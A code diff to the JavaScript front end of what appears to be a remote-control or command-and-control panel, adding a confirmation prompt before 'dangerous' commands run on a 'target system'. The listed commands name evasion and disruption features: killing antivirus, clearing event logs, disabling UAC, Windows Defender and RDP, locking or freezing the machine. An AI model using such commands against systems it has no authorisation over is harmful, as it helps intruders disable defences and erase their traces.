@@ -2,6 +2,25 @@
 let socket;
 let selectedConnection = null;
 
+// Dangerous commands that require confirmation
+const DANGEROUS_COMMANDS = [
+    'clearev',
+    'avkill',
+    'lockscreen',
+    'freeze start',
+    'freeze',
+    'disableRDP',
+    'disableUAC',
+    'disableWindef',
+    'hostsfile remove'
+];
+
+// Helper function to check if a command is dangerous
+function isDangerousCommand(command) {
+    const cmdLower = command.toLowerCase().trim();
+    return DANGEROUS_COMMANDS.some(dangerous => cmdLower.startsWith(dangerous.toLowerCase()));
+}
+
 // CSRF Token Helper
 function getCSRFToken() {
     const metaTag = document.querySelector('meta[name="csrf-token"]');
@@ -183,6 +202,25 @@ function showCommands(category) {
 
 async function executeCommand(command) {
     const outputElem = document.getElementById('commandOutput');
+    
+    // Check if command is dangerous and require confirmation
+    if (isDangerousCommand(command)) {
+        const confirmed = confirm(
+            `⚠️ WARNING: '${command}' is a destructive command.\n\n` +
+            `This action could:\n` +
+            `• Disable security features\n` +
+            `• Clear system logs\n` +
+            `• Disrupt system operations\n` +
+            `• Lock the target system\n\n` +
+            `Are you sure you want to proceed?`
+        );
+        
+        if (!confirmed) {
+            outputElem.textContent = `🚫 Command cancelled by user: ${command}`;
+            showToast('Command cancelled', 'warning');
+            return;
+        }
+    }
     
     outputElem.textContent = '⏳ Executing command...\n\n';
     
